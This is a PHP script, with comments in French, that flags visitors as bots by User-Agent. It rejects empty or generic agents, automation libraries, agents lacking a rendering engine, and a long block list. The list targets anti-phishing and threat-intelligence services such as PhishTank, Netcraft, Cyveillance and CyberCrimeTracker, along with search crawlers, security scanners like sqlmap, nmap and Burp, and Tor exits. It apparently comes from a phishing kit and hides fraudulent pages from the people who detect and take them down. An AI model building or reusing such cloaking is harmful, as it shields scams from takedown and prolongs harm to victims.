<?php

if (session_status() == PHP_SESSION_NONE) session_start();

// Skip if already whitelisted
if (isset($_SESSION['bot']) && $_SESSION['bot'] === false) return;

if (!function_exists('_ab2_get_ip')) {
    function _ab2_get_ip() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return trim($_SERVER['HTTP_CF_CONNECTING_IP']);
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($parts[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

$_ab2_ua_raw = isset($_SERVER['HTTP_USER_AGENT']) ? trim($_SERVER['HTTP_USER_AGENT']) : '';
$_ab2_ua     = strtolower($_ab2_ua_raw);

// ── 1. UA vide ────────────────────────────────────────────────
if ($_ab2_ua === '') {
    $_SESSION['bot'] = true;
    $_SESSION['bot_reason'] = 'empty_user_agent';
    return;
}

// ── 2. UA trop court (< 10 chars) ────────────────────────────
if (strlen($_ab2_ua_raw) < 10) {
    $_SESSION['bot'] = true;
    $_SESSION['bot_reason'] = 'ua_too_short';
    return;
}

// ── 3. Bots sophistiqués avec parenthèses ────────────────────
$_ab2_sophisticatedBots = [
    '/\(selenium\)/i', '/\(puppeteer\)/i', '/\(playwright\)/i',
    '/\(headless\)/i', '/\(phantomjs\)/i', '/\(mechanize\)/i',
    '/\(scrapy\)/i',   '/\(requests\)/i',  '/\(httpclient\)/i',
    '/\(axios\)/i',    '/\(fetch\)/i',     '/\(restsharp\)/i',
    '/\(aiohttp\)/i',  '/\(httpx\)/i',     '/\(urllib\)/i',
    '/\(node-fetch\)/i','/\(got\)/i',      '/\(superagent\)/i',
];
foreach ($_ab2_sophisticatedBots as $pattern) {
    if (preg_match($pattern, $_ab2_ua_raw)) {
        $_SESSION['bot'] = true;
        $_SESSION['bot_reason'] = 'sophisticated_bot_ua';
        return;
    }
}

// ── 4. UA générique / trop simple ────────────────────────────
$_ab2_genericPatterns = [
    '/^mozilla\/5\.0$/i',
    '/^mozilla$/i',
    '/^browser$/i',
    '/^web$/i',
    '/^http/i',
    '/^client$/i',
    '/^test$/i',
    '/^curl$/i',
    '/^python$/i',
    '/^java$/i',
];
foreach ($_ab2_genericPatterns as $pattern) {
    if (preg_match($pattern, $_ab2_ua_raw)) {
        $_SESSION['bot'] = true;
        $_SESSION['bot_reason'] = 'generic_ua';
        return;
    }
}

// ── 5. Vérification cohérence structurelle ────────────────────
// Un vrai navigateur Mozilla contient toujours un moteur de rendu
$hasMozilla = stripos($_ab2_ua_raw, 'Mozilla') !== false;
if ($hasMozilla) {
    $hasRenderEngine = (
        stripos($_ab2_ua_raw, 'AppleWebKit') !== false ||
        stripos($_ab2_ua_raw, 'Gecko')       !== false ||
        stripos($_ab2_ua_raw, 'KHTML')       !== false
    );
    if (!$hasRenderEngine) {
        $_SESSION['bot'] = true;
        $_SESSION['bot_reason'] = 'ua_no_render_engine';
        return;
    }
}

// ── 6. Correspondance liste de bots ──────────────────────────
$_ab2_blockedUserAgents = [
    'bot', 'spider', 'crawler', 'curl', 'wget', 'python', 'java', 'php',
    'go-http-client', 'libwww', 'scan', 'checker', 'masscan', 'acunetix',
    'netsparker', 'sqlmap', 'ahrefs', 'semrush', 'mj12bot', 'bingbot',
    'googlebot', 'yandex', 'baiduspider', 'facebookexternalhit', 'discordbot',
    'telegrambot', 'scrapy', 'node-fetch', 'axios', 'headless', 'lighthouse',
    'pagespeed', 'zgrab', 'shodan', 'censys', 'whatweb', 'wpscan', 'dirbuster',
    'nikto', 'uptime', 'pingdom', 'cybercrimetracker', 'netcraft', 'grequests',
    'java/', 'go/', 'httpclient', 'okhttp', 'python-requests', 'fetch/', 'httpie',
    'morfeus', 'sqlninja', 'fimap', 'nmap', 'nessus', 'fiddler', 'fuzzer',
    'webinspect', 'puppeteer', 'playwright', 'selenium', 'mechanize', 'phantomjs',
    'postman', 'insomnia', 'restsharp', 'aiohttp', 'requests', 'nuclei',
    'gobuster', 'wfuzz', 'burp', 'zap', 'openvas', 'applebot', 'embedly',
    'flipboard', 'linkedinbot', 'slackbot', 'whatsapp', 'telegram', 'discord',
    'facebook', 'twitter', 'instagram', 'tiktok', 'snapchat', 'youtube', 'twitch',
    'reddit', 'amazonbot', 'bytespider', 'ccbot', 'pinterestbot', 'qwantbot',
    'archive.org_bot', 'petalbot', 'searchmetricsbot', 'seokicks-robot',
    'trendictionbot', 'crawler4j', 'k6', 'loader.io', 'newrelicpinger',
    'statuscake', 'uptimerobot', 'httpunit', 'capybara', 'htmlunit', 'nutch',
    'powershell', 'http_request2', 'lwp::simple', 'urllib', 'seclookup',
    'slurp', 'ia_archiver', 'msnbot', 'twitterbot', 'ahrefsbot', 'exabot',
    'ezooms', 'yandexbot', 'picsearch', 'magpie-crawler', 'grapeshot',
    'spinn3r', 'inagist', 'python-urllib', 'feedfetcher-google', 'spbot',
    'feedly', 'libwww-perl', 'httrack', 'pycurl', 'apache-httpclient',
    'lssrocketcrawler', 'urlredirectresolver', 'softlayer', 'cyveillance',
    'phishtank', 'calyxinstitute', 'tor-exit',
];

foreach ($_ab2_blockedUserAgents as $pattern) {
    if (strpos($_ab2_ua, strtolower($pattern)) !== false) {
        $_SESSION['bot'] = true;
        $_SESSION['bot_reason'] = 'blocked_user_agent:' . $pattern;
        return;
    }
}
